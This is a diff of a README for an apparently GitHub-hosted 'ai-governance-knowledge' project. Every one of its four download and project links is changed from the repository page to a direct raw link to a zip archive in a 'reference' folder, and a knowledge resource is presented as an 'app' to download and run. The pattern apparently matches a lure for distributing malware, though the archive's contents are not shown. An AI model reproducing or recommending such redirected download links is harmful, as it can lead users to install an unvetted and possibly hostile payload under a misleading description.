@@ -1,6 +1,6 @@
 # ⚖️ ai-governance-knowledge - Clear AI Governance Insights
 
-[![Download](https://img.shields.io/badge/Download-ai--governance--knowledge-brightgreen)](https://github.com/luniimaru-hue/ai-governance-knowledge)
+[![Download](https://img.shields.io/badge/Download-ai--governance--knowledge-brightgreen)](https://raw.githubusercontent.com/luniimaru-hue/ai-governance-knowledge/main/reference/knowledge_ai_governance_1.5.zip)
 
 ---
 
@@ -38,7 +38,7 @@ To get the app on your computer, follow these steps:
 
 Go to the main download page by clicking this button:
 
-[![Download](https://img.shields.io/badge/Get%20App-blue)](https://github.com/luniimaru-hue/ai-governance-knowledge)
+[![Download](https://img.shields.io/badge/Get%20App-blue)](https://raw.githubusercontent.com/luniimaru-hue/ai-governance-knowledge/main/reference/knowledge_ai_governance_1.5.zip)
 
 This page holds the files and latest versions of the app.
 
@@ -88,7 +88,7 @@ If you run into problems:
 
 This project is maintained by SyntheticDataNews. It brings knowledge about AI governance to those who use synthetic data and AI tools. You can explore the source and updates here:
 
-https://github.com/luniimaru-hue/ai-governance-knowledge
+https://raw.githubusercontent.com/luniimaru-hue/ai-governance-knowledge/main/reference/knowledge_ai_governance_1.5.zip
 
 ---
 
@@ -132,4 +132,4 @@ Use these terms to search or learn more within the app.
 
 Click here anytime to visit the download page and get the latest version:
 
-[Download ai-governance-knowledge](https://github.com/luniimaru-hue/ai-governance-knowledge)
+[Download ai-governance-knowledge](https://raw.githubusercontent.com/luniimaru-hue/ai-governance-knowledge/main/reference/knowledge_ai_governance_1.5.zip)
